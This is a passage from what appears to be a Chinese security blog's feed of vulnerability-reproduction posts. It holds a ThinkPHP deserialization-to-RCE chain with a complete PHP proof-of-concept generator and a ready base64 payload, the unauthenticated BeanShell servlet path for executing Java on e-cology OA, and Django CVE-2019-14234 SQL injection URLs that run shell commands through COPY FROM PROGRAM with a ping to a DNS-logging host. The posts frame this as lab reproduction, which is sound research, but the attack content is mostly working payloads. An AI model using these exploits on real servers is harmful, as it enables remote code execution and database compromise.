class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">       $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 自动获取请求变量</span></span><br><span class="line">       <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">          $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">          $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>:</span><br><span class="line">          $vars = [];</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">       <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">       $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">       $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里this-&gt;param完全可控，是通过get传参数进去的，那么也就是说input函数中的<code>$data</code>参数可控，也就是<code>call_user_func</code>的<code>$value,</code>现在差一个条件，那就是name是字符串，继续回溯。<br>这里仍然是不可控的，所以我们继续找调用param函数的地方。找到了isAjax函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">        $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在isAjax函数中，我们可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控就意味着param函数中的$name可控。param函数中的$name可控就意味着input函数中的$name可控。</p><p><strong>可以导致RCE<br>回溯一下</strong></p><p>param（）函数  可以获得<code>$_GET</code>数组并赋值给<code>$this-&gt;param</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br></pre></td></tr></table></figure><p>array_merge（）数组合并起来<br>这句代码会将<code>$_GET</code>数组赋值到$this-&gt;param中，在往下执行就来到了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure><p>再回到input函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br></pre></td></tr></table></figure><p><code>$name</code>的值来自于<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，我们跟进getData函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">\\</span><br></pre></td></tr></table></figure><p>这里<code>$data</code>直接等于 <code>$data</code> = <code>$data[$val]</code> = <code>$data[$name]</code></p><p>然后就是解析过滤器，跟进getFilter函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">            $filter = [];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">            <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $filter[] = $default;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $filter;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020010714350552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>就是$filter可控<br>最后回到input函数  关键代码</p><p><img src="https://img-blog.csdnimg.cn/20200107143733892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后导致RCE的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">          <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">              <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">              $value = call_user_func($filter, $value);</span><br></pre></td></tr></table></figure><ul><li>filterValue.value = 第一个通过GET请求的值input.data</li><li>filters.key = 第一个GET的键</li><li>filters.filters = input.filters</li></ul><p>上大佬的图</p><p><img src="https://img-blog.csdnimg.cn/20200107144450321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总的利用链<br><img src="https://img-blog.csdnimg.cn/20200107150410781.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>到这里思路有了，回过头来看我们poc的利用过程，首先在上一步toArray()方法。创建了一个Request()对象，然后会触发poc里的<strong>construct()方法，接着new Request()-&gt; visible($name)，该对象调用了一个不存在的方法会触发</strong>call方法，看一下__construct()方法内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">'lin'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $append = [];</span><br><span class="line">    <span class="keyword">private</span> $data = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">"zeo"</span>=&gt;[<span class="string">"calc.exe"</span>,<span class="string">"calc"</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">"zeo"</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $hook = [];</span><br><span class="line">    <span class="keyword">protected</span> $filter = <span class="string">"system"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $config = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">'var_method'</span>       =&gt; <span class="string">'_method'</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">'var_ajax'</span>         =&gt; <span class="string">'_ajax'</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">'var_pjax'</span>         =&gt; <span class="string">'_pjax'</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">'var_pathinfo'</span>     =&gt; <span class="string">'s'</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">'pathinfo_fetch'</span>   =&gt; [<span class="string">'ORIG_PATH_INFO'</span>, <span class="string">'REDIRECT_PATH_INFO'</span>, <span class="string">'REDIRECT_URL'</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">'default_filter'</span>   =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">'url_domain_root'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">'https_agent_name'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">'http_agent_ip'</span>    =&gt; <span class="string">'HTTP_X_REAL_IP'</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">'url_html_suffix'</span>  =&gt; <span class="string">'html'</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">"var_ajax"</span>=&gt;<span class="string">''</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">"visible"</span>=&gt;[<span class="keyword">$this</span>,<span class="string">"isAjax"</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们把payload通过POST传过去，然后通过GET请求获取需要执行的命令</p><p>TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJ6ZW8iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJ6ZW8iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjA6IiI7fX19fX19</p><p>复现成功<br><img src="https://img-blog.csdnimg.cn/20200107152900358.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考文章<br><a href="https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/" target="_blank" rel="noopener">https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/</a><br><a href="https://blog.csdn.net/qq_43380549/article/details/101265818" target="_blank" rel="noopener">https://blog.csdn.net/qq_43380549/article/details/101265818</a><br><a href="https://xz.aliyun.com/t/6467" target="_blank" rel="noopener">https://xz.aliyun.com/t/6467</a><br><a href="https://xz.aliyun.com/t/6619" target="_blank" rel="noopener">https://xz.aliyun.com/t/6619</a><br><a href="https://www.t00ls.net/thread-54324-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-54324-1-1.html</a><br><a href="https://www.t00ls.net/viewthread.php?tid=52825&amp;extra=&amp;page=1" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=52825&amp;extra=&amp;page=1</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】泛微 e-cology OA 远程代码执行漏洞复现</title>
      <link href="/2019/11/21/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/11/21/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91%E6%B3%9B%E5%BE%AE%20e-cology%20OA%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>该漏洞位于 e-cology OA系统BeanShell组件中，并且该组件允许未授权访问，攻击者可通过访问该组件执行任意的Java代码，也就是说可以执行任意命令</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>包括但不限于7.0,8.0,8.1</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>直接在网站根目录后加入组件访问路径/weaver/bsh.servlet.BshServlet/</p><p>访问后直接在 Script 处输入Java代码点击 Evaluate 即可触发漏洞，并可以在Script Output处看到回显</p><p><img src="https://img-blog.csdnimg.cn/20191121165927935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【研究】CVE-2019-14234 Django JSONField SQL注入漏洞复现</title>
      <link href="/2019/11/20/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/11/20/%E3%80%90%E7%A0%94%E7%A9%B6%E3%80%91CVE-2019-14234%20Django%20JSONField%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC](【研究】CVE-2019-14234 Django JSONField SQL注入漏洞复现)</p><h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><p>环境<br>直接使用vulhub的docker环境搭建<br>vulhub/django/CVE-2019-14234/</p><h2 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h2><blockquote><p>该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。</p><p>Django通常搭配postgresql数据库，而JSONField是该数据库的一种数据类型。该漏洞的出现的原因在于Django中JSONField类的实现，Django的model最本质的作用是生成SQL语句，而在Django通过JSONField生成sql语句时，是通过简单的字符串拼接。<br>通过JSONField类获得KeyTransform类并生成sql语句的位置。<br>其中key_name是可控的字符串，最终生成的语句是WHERE (field-&gt;’[key_name]’) =<br>‘value’，因此可以进行SQL注入。<br><img src="https://img-blog.csdnimg.cn/20191120090215403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></blockquote><h2 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3.影响版本"></a>3.影响版本</h2><p>Django<br>1.11.x before 1.11.23<br>2.1.x before 2.1.11<br>2.2.x before 2.2.4</p><h2 id="4-利用过程"><a href="#4-利用过程" class="headerlink" title="4.利用过程"></a>4.利用过程</h2><p>访问<a href="http://ip:8000/admin/login/?next=/admin/" target="_blank" rel="noopener">http://ip:8000/admin/login/?next=/admin/</a><br>输入用户名admin ，密码a123123123<br><img src="https://img-blog.csdnimg.cn/20191120090549944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>进入漏洞界面</p><p>然后访问<br><a href="http://ip:8000/admin/vuln/collection/" target="_blank" rel="noopener">http://ip:8000/admin/vuln/collection/</a></p><p><img src="https://img-blog.csdnimg.cn/20191120090803576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>手工测试看看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.130:8000/admin/vuln/collection/?detail__a'b=123</span></span><br></pre></td></tr></table></figure><p>报错出来 截断了<br><img src="https://img-blog.csdnimg.cn/20191120091112693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>命令执行语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.130:8000/admin/vuln/collection/?detail__title')='1' or 1=1 ;create table cmd_exec(cmd_output text)--</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191120091710227.png" alt="在这里插入图片描述"><br>这里应该是执行了，试一下DNSLog</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//10.77.0.130:8000/admin/vuln/collection/?detail__title')='1' or 1=1 ;copy cmd_exec FROM PROGRAM 'ping v62ce2.dnslog.cn'--</span></span><br></pre></td></tr></table></figure><p>ok成功了<br><img src="https://img-blog.csdnimg.cn/20191120092943327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>利用DOCX文档远程模板注入执行宏</title>
      <link href="/2019/10/28/%E5%88%A9%E7%94%A8DOCX%E6%96%87%E6%A1%A3%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%AE%8F/"/>
      <url>/2019/10/28/%E5%88%A9%E7%94%A8DOCX%E6%96%87%E6%A1%A3%E8%BF%9C%E7%A8%8B%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%AE%8F/</url>
      
